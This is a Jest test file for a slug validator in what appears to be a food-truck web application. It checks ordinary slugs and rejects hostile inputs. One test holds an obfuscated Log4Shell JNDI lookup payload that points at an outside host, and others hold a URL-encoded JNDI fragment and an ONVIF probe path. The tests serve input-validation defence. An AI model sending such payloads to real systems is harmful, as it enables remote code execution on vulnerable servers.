import { describe, it, expect } from '@jest/globals';
import { isValidSlug } from '@/lib/utils/slugify';

describe('isValidSlug', () => {
  it('rejects empty string', () => {
    expect(isValidSlug('')).toBe(false);
  });

  it('rejects single character', () => {
    expect(isValidSlug('a')).toBe(false);
  });

  it('accepts valid truck slug', () => {
    expect(isValidSlug('joes-tacos')).toBe(true);
  });

  it('accepts slug with short ID suffix', () => {
    expect(isValidSlug('joes-tacos-a1b2')).toBe(true);
  });

  it('accepts slug with numbers', () => {
    expect(isValidSlug('trucks-r-us-99')).toBe(true);
  });

  it('accepts simple alphanumeric slug', () => {
    expect(isValidSlug('taco-truck')).toBe(true);
  });

  it('rejects Log4Shell payload', () => {
    const payload =
      '${j${lower:n}${::-d}${::-i}:${::-d}ns://192.168.1.254:39359/wzhowHuBFXEKnvrGANkAeqXyWeNnRXvP}';
    expect(isValidSlug(payload)).toBe(false);
  });

  it('rejects URL-encoded exploit characters', () => {
    expect(isValidSlug('%24%7Bjndi%7D')).toBe(false);
  });

  it('rejects slug with dollar sign', () => {
    expect(isValidSlug('$exploit')).toBe(false);
  });

  it('rejects slug with curly braces', () => {
    expect(isValidSlug('{payload}')).toBe(false);
  });

  it('rejects slug with colons', () => {
    expect(isValidSlug('scheme://host')).toBe(false);
  });

  it('rejects slug with forward slashes', () => {
    expect(isValidSlug('path/to/truck')).toBe(false);
  });

  it('rejects slug with dots', () => {
    expect(isValidSlug('script.php')).toBe(false);
  });

  it('rejects slug with spaces', () => {
    expect(isValidSlug('my truck')).toBe(false);
  });

  it('rejects slug with special regex chars', () => {
    expect(isValidSlug('truck.*')).toBe(false);
  });

  it('rejects slug that is only hyphens', () => {
    expect(isValidSlug('---')).toBe(false);
  });

  it('rejects slug starting with hyphen', () => {
    expect(isValidSlug('-truck')).toBe(false);
  });

  it('rejects slug ending with hyphen', () => {
    expect(isValidSlug('truck-')).toBe(false);
  });

  it('rejects excessively long slug', () => {
    const longSlug = 'a'.repeat(201);
    expect(isValidSlug(longSlug)).toBe(false);
  });

  it('accepts slug at max length boundary (200 chars)', () => {
    const slug = 'a'.repeat(200);
    expect(isValidSlug(slug)).toBe(true);
  });

  it('accepts slug with consecutive hyphens if produced by slugify', () => {
    expect(isValidSlug('joes--truck')).toBe(true);
  });

  it('rejects null bytes', () => {
    expect(isValidSlug('truck\x00name')).toBe(false);
  });

  it('rejects unicode control characters', () => {
    expect(isValidSlug('truck\u0001name')).toBe(false);
  });

  it('rejects ONVIF probe path', () => {
    expect(isValidSlug('onvif/device_service')).toBe(false);
  });

  it('accepts reserved-sounding slugs (reserved check is caller responsibility)', () => {
    expect(isValidSlug('wp-admin')).toBe(true);
  });
});
